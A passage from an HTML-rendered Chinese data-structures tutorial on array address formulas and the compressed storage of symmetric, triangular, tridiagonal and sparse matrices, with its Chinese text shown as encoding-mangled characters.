stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mi>i</mi><mo>Ã—</mo><mi>L</mi><mo stretchy="false">(</mo><mn>0</mn><mo>&lt;</mo><mo>=</mo><mi>i</mi><mo>&lt;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">LOC(a_i)=LOC(a_0)+i\times L(0&lt;=i&lt;n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69862em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>â€‹å…¶ä¸­ï¼ŒL æ˜¯æ¯ä¸ªæ•°ç»„å…ƒç´ æ‰€å çš„å­˜å‚¨å•å…ƒã€‚</p><p>â€‹å¯¹äºå¤šç»´æ•°ç»„ï¼Œæœ‰ä¸¤ç§æ˜ å°„æ–¹æ³•ï¼šæŒ‰è¡Œä¼˜å…ˆå’ŒæŒ‰åˆ—ä¼˜å…ˆã€‚ä»¥äºŒç»´æ•°ç»„ä¸ºä¾‹ï¼ŒæŒ‰è¡Œä¼˜å…ˆå­˜å‚¨çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šå…ˆè¡Œååˆ—ï¼Œå…ˆå­˜å‚¨è¡Œå·è¾ƒå°çš„å…ƒç´ ï¼Œè¡Œå·ç›¸ç­‰å…ˆå­˜å‚¨åˆ—å¥½è¾ƒå°çš„å…ƒç´ ã€‚è®¾äºŒç»´æ•°ç»„çš„è¡Œä¸‹æ ‡ä¸åˆ—ä¸‹æ ‡çš„èŒƒå›´åˆ†åˆ«ä¸º [0,h1] ä¸ [0,h2]ï¼Œåˆ™å­˜å‚¨ç»“æ„å…³ç³»æ˜¯ä¸ºï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">[</mo><mi>i</mi><mo>Ã—</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>j</mi><mo stretchy="false">]</mo><mo>Ã—</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">LOC(a_{i,j})=LOC(a_{0,0})+[i\times (h_2 + 1) + j]\times L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span></span></p><p>â€‹ä¾‹å¦‚ï¼Œå¯¹äºæ•°ç»„  <code>A[2][3]</code> ï¼Œå®ƒæŒ‰è¡Œä¼˜å…ˆæ–¹å¼åœ¨å†…å­˜ä¸­çš„å­˜å‚¨å½¢å¼å¦‚ä¸‹å›¾ï¼š</p><p>`<img data-src="https://i-blog.csdnimg.cn/direct/576457ac022746b385f9ad0bec3a0f7e.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å½“ä»¥åˆ—ä¼˜å…ˆæ–¹å¼å­˜å‚¨æ—¶ï¼Œå¾—å‡ºå­˜å‚¨ç»“æ„å…³ç³»å¼ä¸ºï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mi>O</mi><mi>C</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mrow><mn>0</mn><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">[</mo><mi>j</mi><mo>Ã—</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mn>1</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>i</mi><mo stretchy="false">]</mo><mo>Ã—</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">LOC(a_{i,j})=LOC(a_{0,0})+[j\times (h_1 + 1) + i]\times L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span></span></p><p>â€‹ä¾‹å¦‚ï¼Œå¯¹äºæ•°ç»„  <code>A[2][3]</code> ï¼Œå®ƒæŒ‰åˆ—ä¼˜å…ˆæ–¹å¼åœ¨å†…å­˜ä¸­çš„å­˜å‚¨å½¢å¼å¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a3b1764beefe443995c34f3c76038062.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="343-ç‰¹æ®ŠçŸ©é˜µçš„å‹ç¼©å­˜å‚¨"><a class="markdownIt-Anchor" href="#343-ç‰¹æ®ŠçŸ©é˜µçš„å‹ç¼©å­˜å‚¨">#</a> 3.4.3ã€ç‰¹æ®ŠçŸ©é˜µçš„å‹ç¼©å­˜å‚¨</h2><p>â€‹å‹ç¼©å­˜å‚¨ï¼šæŒ‡ä¸ºå¤šä¸ªå€¼ç›¸åŒçš„å…ƒç´ åªåˆ†é…ä¸€ä¸ªå­˜å‚¨ç©ºé—´ï¼Œå¯¹é›¶å…ƒç´ ä¸åˆ†é…å­˜å‚¨ç©ºé—´ã€‚å…¶ç›®çš„æ˜¯èŠ‚çœç©ºé—´ã€‚</p><p>â€‹ç‰¹æ®ŠçŸ©é˜µï¼šæŒ‡å…·æœ‰è®¸å¤šç›¸åŒçŸ©é˜µå…ƒç´ æˆ–é›¶å…ƒç´ ï¼Œå¹¶ä¸”è¿™äº›ç›¸åŒçŸ©é˜µå…ƒç´ æˆ–é›¶å…ƒç´ çš„åˆ†å¸ƒæœ‰ä¸€å®šè§„å¾‹æ€§çš„çŸ©é˜µã€‚å¸¸è§çš„ç‰¹æ®ŠçŸ©é˜µæœ‰å¯¹ç§°çŸ©é˜µã€ä¸Šï¼ˆä¸‹ï¼‰ä¸‰è§’çŸ©é˜µã€å¯¹è§’çŸ©é˜µã€‚</p><p>â€‹ç‰¹æ®ŠçŸ©é˜µçš„å‹ç¼©å­˜å‚¨æ–¹æ³•ï¼šæ‰¾å‡ºç‰¹æ®ŠçŸ©é˜µä¸­å€¼ç›¸åŒçš„çŸ©é˜µå…ƒç´ çš„åˆ†å¸ƒè§„å¾‹ï¼ŒæŠŠé‚£äº›å‘ˆç°è§„å¾‹æ€§åˆ†å¸ƒçš„ã€å€¼ç›¸åŒçš„å¤šä¸ªçŸ©é˜µå…ƒç´ å‹ç¼©é“ä¸€ä¸ªå­˜å‚¨ç©ºé—´ä¸­ã€‚</p><h3 id="1-å¯¹ç§°çŸ©é˜µ"><a class="markdownIt-Anchor" href="#1-å¯¹ç§°çŸ©é˜µ">#</a> 1ã€å¯¹ç§°çŸ©é˜µ</h3><p>â€‹è‹¥å¯¹ä¸€ä¸ª n é˜¶çŸ©é˜µ A ä¸­çš„ä»»æ„ä¸€ä¸ªå…ƒç´  a [i,j] éƒ½æœ‰ <code>a[i,j]=a[j,i](1&lt;=i,j&lt;=n)</code> ï¼Œåˆ™ç§°å…¶ä¸ºå¯¹ç§°çŸ©é˜µã€‚å…¶ä¸­çš„å…ƒç´ å¯ä»¥åˆ’åˆ†ä¸º 3 ä¸ªéƒ¨åˆ†ï¼Œå³ä¸Šä¸‰è§’åŒºã€ä¸»å¯¹è§’çº¿å’Œä¸‹ä¸‰è§’åŒºï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/faf3cba2c0204112b592a54ad8446e4e.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¯¹äº n é˜¶å¯¹ç§°çŸ©é˜µï¼Œä¸Šä¸‰è§’åŒºçš„æ‰€æœ‰å…ƒç´ å’Œä¸‹ä¸‰è§’åŒºçš„å¯¹åº”å…ƒç´ ç›¸åŒï¼Œè‹¥ä»é‡‡ç”¨äºŒç»´æ•°ç»„å­˜æ”¾ï¼Œåˆ™ä¼šæµªè´¹å‡ ä¹ä¸€åŠçš„ç©ºé—´ï¼Œä¸ºæ­¤å°† n é˜¶å¯¹ç§°çŸ©é˜µ A å­˜æ”¾åœ¨ä»¥ä¸ºæ•°ç»„  <code>[n(n+1)/2]</code>  ä¸­ï¼Œå³å…ƒç´  a [i,j] å­˜æ”¾åœ¨ b_k ä¸­ã€‚æ¯”å¦‚åªå­˜æ”¾ä¸‹ä¸‰è§’éƒ¨åˆ†ï¼ˆå«ä¸»å¯¹è§’ï¼‰çš„å…ƒç´ ã€‚</p><p>â€‹åœ¨æ•°ç»„ B ä¸­ï¼Œä½äºå…ƒç´   <code>a[i,j](i&gt;=j)</code>  å‰é¢çš„å…ƒç´ ä¸ªæ•°ä¸º</p><p><img data-src="https://i-blog.csdnimg.cn/direct/00b2e2af94f94712907d5ceb80084ffe.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å› æ­¤ï¼Œå…ƒç´  a [i,j] åœ¨æ•°ç»„ B ä¸­çš„ä¸‹æ ‡ k = 1+2+â€¦(i-1)+j-1=i (i-1) / 2 + j-1 ï¼ˆæ•°ç»„ä¸‹æ ‡ä» 0 å¼€å§‹ï¼‰ã€‚å› æ­¤ï¼Œå…ƒç´ ä¸‹æ ‡ä¹‹é—´çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/cbcad10b1b584fbbb8b0002d1d3939ef.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å½“æ•°ç»„ä¸‹æ ‡ä» 1 å¼€å§‹æ—¶ï¼Œå¯ä»¥é‡‡ç”¨åŒæ ·çš„æ¨å¯¼æ–¹æ³•ï¼Œè¯·è¯»è€…è‡ªè¡Œæ€è€ƒã€‚</p><p>â€‹** æ³¨æ„ï¼š** äºŒç»´æ•°ç»„  <code>A[n][n]</code>  å’Œ  <code>A[0...n-1][0...n-1]</code>  çš„å†™æ³•æ˜¯ç­‰ä»·çš„ã€‚å¦‚æœæ•°ç»„å†™ä¸º  <code>A[1...n][1...n]</code> ï¼Œåˆ™è¯´æ˜æŒ‡å®šäº†ä»ä¸‹æ ‡ 1 å¼€å§‹å­˜å‚¨å…ƒç´ ã€‚äºŒç»´æ•°ç»„å…ƒç´ å†™ä¸º  <code>a[i][j]</code> ï¼Œæ³¨æ„æ•°ç»„å…ƒç´ ä¸‹æ ‡ i å’Œ j é€šå¸¸æ˜¯ä» 0 å¼€å§‹çš„ã€‚çŸ©é˜µå…ƒç´ é€šå¸¸å†™ä¸º  ai,j æˆ– a (i)(j)ï¼Œæ³¨æ„è¡Œå· i å’Œ åˆ—å· j æ˜¯ä» 1 å¼€å§‹çš„ã€‚</p><h3 id="2-ä¸‰è§’çŸ©é˜µ"><a class="markdownIt-Anchor" href="#2-ä¸‰è§’çŸ©é˜µ">#</a> 2ã€ä¸‰è§’çŸ©é˜µ</h3><p>â€‹ä¸‹ä¸‰è§’çŸ©é˜µä¸­ï¼Œä¸Šä¸‰è§’åŒºçš„æ‰€æœ‰å…ƒç´ å‡ä¸ºåŒä¸€å¸¸é‡ã€‚å…¶å­˜å‚¨æ€æƒ³ä¸å¯¹ç§°çŸ©é˜µç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºå­˜å‚¨å®Œä¸‹ä¸‰è§’åŒºå’Œä¸»å¯¹è§’çº¿ä¸Šçš„å…ƒç´ ä¹‹åï¼Œç´§æ¥ç€å­˜å‚¨å¯¹è§’çº¿ä¸Šæ–¹çš„å¸¸é‡ä¸€æ¬¡ï¼Œæ•…å¯ä»¥å°† n é˜¶ä¸‹ä¸‰è§’çŸ©é˜µ A å‹ç¼©å­˜å‚¨åœ¨ B [n (n+1)/2+1] ä¸­ã€‚</p><p>â€‹å…ƒç´ ä¸‹æ ‡ä¹‹é—´çš„å¯¹åº”å…³ç³»ä¸ºï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/c7c97b11d99841f8939acea97ae54579.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¸‹ä¸‰è§’çŸ©é˜µåœ¨å†…å­˜ä¸­çš„å‹ç¼©å­˜å‚¨å½¢å¼å¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/2fc8fb16a4e84f438851dadc1a1f17c6.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¸Šä¸‰è§’çŸ©é˜µä¸­ï¼Œä¸‹ä¸‰è§’åŒºçš„æ‰€æœ‰å…ƒç´ å‡ä¸ºåŒä¸€å¸¸é‡ã€‚åªéœ€å­˜å‚¨å¯¹è§’çº¿ã€ä¸Šä¸‰è§’åŒºä¸Šçš„å…ƒç´ å’Œä¸‹ä¸‰è§’åŒºçš„å¸¸é‡ä¸€æ¬¡ï¼Œå¯å°†å…¶å‹ç¼©å­˜å‚¨åœ¨ B [n (n+1)/2+1] ä¸­ã€‚</p><p>â€‹å› æ­¤ï¼Œå…ƒç´  a [i,j] åœ¨æ•°ç»„ B ä¸­çš„ä¸‹æ ‡ k = n+(n-1)+â€¦+(n-i+2)+(j-i+1)-1=(i-1)(2n-i+2)/2+(j-i)ã€‚å› æ­¤ï¼Œå…ƒç´ ä¸‹æ ‡ä¹‹é—´çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6c3165bd9a374456b8daf479ae658e86.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¸Šä¸‰è§’çŸ©é˜µåœ¨å†…å­˜ä¸­çš„å‹ç¼©å­˜å‚¨å½¢å¼å¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/ad73d481dfb541b88f11a334e1c0a728.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä»¥ä¸Šæ¨åˆ°å‡å‡è®¾ä¸‹æ ‡ä» 0 å¼€å§‹ã€‚</p><h3 id="3-ä¸‰å¯¹è§’çŸ©é˜µ"><a class="markdownIt-Anchor" href="#3-ä¸‰å¯¹è§’çŸ©é˜µ">#</a> 3ã€ä¸‰å¯¹è§’çŸ©é˜µ</h3><p>â€‹å¯¹è§’çŸ©é˜µä¹Ÿç§°å¸¦çŠ¶çŸ©é˜µã€‚å¯¹äº n é˜¶çŸ©é˜µ A ä¸­çš„ä»»æ„ä¸€ä¸ªå…ƒç´  a [i,j]ï¼Œå½“ |i-j|&gt;1 æ—¶ï¼Œæœ‰ a [i,j]=0 (1&lt;=i,j&lt;n)ï¼Œåˆ™ç§°ä¸ºä¸‰å¯¹è§’çŸ©é˜µï¼Œå¦‚ä¸‹å›¾ã€‚åœ¨ä¸‰å¯¹è§’çŸ©é˜µä¸­ï¼Œæ‰€æœ‰éé›¶å…ƒç´ éƒ½é›†ä¸­åœ¨ä»¥ä¸»å¯¹è§’çº¿ä¸ºä¸­å¿ƒçš„ 3 æ¡å¯¹è§’çº¿çš„åŒºåŸŸï¼Œå…¶ä»–åŒºåŸŸçš„å…ƒç´ éƒ½ä¸º 0.</p><p><img data-src="https://i-blog.csdnimg.cn/direct/525858a40a3b4ef6a69ecfa88f9ec98a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¸‰å¯¹è§’çŸ©é˜µ A ä¹Ÿå¯ä»¥é‡‡ç”¨å‹ç¼©å­˜å‚¨ï¼Œå°† 3 æ¡å¯¹è§’çº¿ä¸Šçš„å…ƒç´ æŒ‰è¡Œä¼˜å…ˆæ–¹å¼å­˜æ”¾åœ¨ä¸€ç»´æ•°ç»„ B ä¸­ï¼Œä¸” a [1,1] å­˜æ”¾åœ¨ B [0] ä¸­ï¼Œå…¶å­˜å‚¨å½¢å¼ä¸‹å›¾ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/76c317f9a83f43c9a0c31bd6578e82c3.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å› æ­¤å¯ä»¥è®¡ç®—çŸ©é˜µ A ä¸­ 3 æ¡å¯¹è§’çº¿ä¸Šçš„å…ƒç´   <code>a[i,j](1&lt;=i,j&lt;=n,|i-j|&lt;=1)</code>  åœ¨ä¸€ç»´æ•°ç»„ B ä¸­å­˜æ”¾çš„ä¸‹æ ‡ä¸º k=2i+j-3.</p><p>â€‹åä¹‹ï¼Œè‹¥å·²çŸ¥ä¸‰å¯¹è§’çº¿çŸ©é˜µä¸­æŸå…ƒç´  a [i,j] å­˜æ”¾äºä¸€ç»´æ•°ç»„ B çš„ç¬¬ k ä¸ªä½ç½®ï¼Œåˆ™å¯å¾— i=[(k+1)/3+1]ï¼Œj=k-2i+3ã€‚</p><h2 id="344-ç¨€ç–çŸ©é˜µ"><a class="markdownIt-Anchor" href="#344-ç¨€ç–çŸ©é˜µ">#</a> 3.4.4ã€ç¨€ç–çŸ©é˜µ</h2><p>â€‹çŸ©é˜µä¸­éé›¶å…ƒç´ çš„ä¸ªæ•° tï¼Œç›¸å¯¹çŸ©é˜µå…ƒç´ çš„ä¸ªæ•° s æ¥è¯´éå¸¸å°‘ï¼Œå³ s&gt;&gt;t çš„çŸ©é˜µç§°ä¸ºç¨€ç–çŸ©é˜µã€‚</p><p>â€‹è‹¥é‡‡ç”¨å¸¸è§„çš„æ–¹æ³•å­˜å‚¨ç¨€ç–çŸ©é˜µï¼Œåˆ™ç›¸å½“æµªè´¹å­˜å‚¨èµ„æºï¼Œå› æ­¤ä»…å­˜å‚¨éé›¶å…ƒç´ ã€‚ä½†é€šå¸¸éé›¶å…ƒç´ çš„åˆ†å¸ƒæ²¡æœ‰è§„å¾‹ï¼Œæ‰€ä»¥ä»…å­˜å‚¨éé›¶å…ƒç´ çš„å€¼æ—¶ä¸å¤Ÿçš„ï¼Œè¿˜è¦å­˜å‚¨å®ƒæ‰€åœ¨çš„è¡Œå’Œåˆ—ã€‚å› æ­¤ï¼Œå°†éé›¶å…ƒç´ åŠå…¶ç›¸åº”çš„è¡Œå’Œåˆ—æ„æˆä¸€ä¸ªä¸‰å…ƒæ•°ç»„ï¼ˆèˆªæ ‡ï¼Œåˆ—æ ‡ï¼Œå€¼ï¼‰ï¼Œå¦‚ä¸‹å›¾ã€‚ç„¶åæŒ‰ç…§æŸç§è§„å¾‹å­˜å‚¨è¿™äº›ä¸‰å…ƒç»„ã€‚ç¨€ç–çŸ©é˜µå‹ç¼©å­˜å‚¨åä¾¿å¤±å»äº†éšæœºå­˜å–ç‰¹æ€§ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/d96a70ff96604dc5abae39505f306ba3.png#pic_center" 